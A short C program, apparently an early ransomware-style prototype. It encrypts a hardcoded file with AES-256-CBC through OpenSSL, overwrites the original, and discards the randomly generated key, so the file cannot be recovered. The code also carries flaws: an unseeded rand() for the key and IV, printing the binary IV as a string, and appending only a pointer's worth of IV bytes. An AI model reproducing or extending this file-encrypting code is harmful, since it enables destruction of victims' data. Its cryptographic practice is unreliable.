#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h> // use openssl evp for encryption
#include <openssl/err.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

void encrypt(unsigned char *key) {
    // AES Encryption parameters
    int block_size = 16; // AES uses 128-bit block size encryption
    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new(); // New ctx cipher
    
    unsigned char *iv = malloc(16); // IV is always 16 bytes
    // Generate the IV
    size_t i;
    for (i = 0; i < 16; i++) {
         iv[i] = rand();
    }
    printf("%s", iv);    
    // Initiate cipher and store key/iv in it
    EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, 1);

    // Buffer paramters
    unsigned char buffer[1024];
    unsigned char buffer_out[1024 + block_size];

    // File information -- only one for testing right now
    FILE *curr_file, *temp_output;
    char fileName[] = "file_to_encrypt.txt";
    char fileTemp[] = "temp_file.txt";

    // Read the binaries of the current file
    curr_file = fopen(fileName, "rb");
    temp_output = fopen(fileTemp, "wb");

    // Read in the current file into blocks
    int bytes_read, out_len;
    while(1) {
        bytes_read = fread(buffer, sizeof(unsigned char), 1024, curr_file);
        EVP_CipherUpdate(ctx, buffer_out, &out_len, buffer, bytes_read);
        fwrite(buffer_out, sizeof(unsigned char), out_len, temp_output);
        if (bytes_read < 1024) {
            break;
        }
    }

    // Cipher the block 
    EVP_CipherFinal_ex(ctx, buffer_out, &out_len);
    fwrite(buffer_out, sizeof(unsigned char), out_len, temp_output);
    EVP_CIPHER_CTX_cleanup(ctx);
    fclose(temp_output);
    
    // Append the IV to the file for decryption later
    temp_output = fopen(fileTemp, "a");
    fwrite(iv, sizeof(unsigned char), sizeof(iv), temp_output);

    // Close the file when encryption is complete
    fclose(curr_file);
    remove(fileName); // Delete the current file
    rename(fileTemp, fileName); // Rename our temp to override the current file even if it wasn't deleted
}

int main () {
    // Our cipher parameters
    int num_bytes = 32; // 256-bit key size
    unsigned char *key = malloc(num_bytes);
    
    // Generate the key
    size_t i;
    for (i = 0; i < num_bytes; i++) {
         key[i] = rand();
    }

    // Call the encryption function to encrypt the files
    encrypt(key);
    
    // We don't like our keys being stored in the memory
    free(key);
    return 0;
}